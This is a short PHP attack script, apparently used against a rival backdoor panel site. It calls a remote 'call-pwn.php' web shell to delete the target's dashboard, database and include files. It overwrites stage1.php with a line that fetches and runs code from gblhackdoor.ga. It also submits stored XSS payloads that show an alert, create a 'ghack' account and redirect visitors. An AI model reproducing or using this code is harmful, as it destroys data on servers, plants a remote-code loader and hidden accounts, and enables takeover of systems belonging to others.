<?php
include('../class/include.php');
if (!Account::isAuthentified() || !CSRF::isAjaxRequest())
{
    die("Bad request");
}

$url = $_POST["url"];


file_get_contents(str_replace("stage2.php", "ajax/call-pwn.php?cmd=unlink('../../dashboard.php');", $url));
file_get_contents(str_replace("stage2.php", "ajax/call-pwn.php?cmd=unlink('../class/Database.php');", $url));
file_get_contents(str_replace("stage2.php", "ajax/call-pwn.php?cmd=unlink('../class/include.php');", $url));
file_get_contents(str_replace("stage2.php", "ajax/call-pwn.php?cmd=file_put_contents('../stage1.php', 'http.Fetch([[http://gblhackdoor.ga/core/stage1.php?key=6]],RunString)');", $url));

function httpPost($url, $data)
{
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($curl);
    curl_close($curl);
    return $response;
}
httpPost($url, [
"i" => mt_rand() . "", "nb" => mt_rand() . "", "n" => mt_rand() . "<script>alert('niqued');</script>"
]);
httpPost($url, [
"i" => mt_rand() . "", "nb" => mt_rand() . "", "n" => mt_rand() . "<script>$.ajax({url: 'core/ajax/add-user.php?username=ghack&password=ghack&cpassword=ghack'});</script>"
]);
httpPost($url, [
"i" => mt_rand() . "", "nb" => mt_rand() . "", "n" => mt_rand() . "<script>window.location.href = 'https://68.media.tumblr.com/7ef8226a18f2679fdf978746f19a55ca/tumblr_om5j9lK4Ih1vj5j9co1_500.gif';</script>"
]);
?>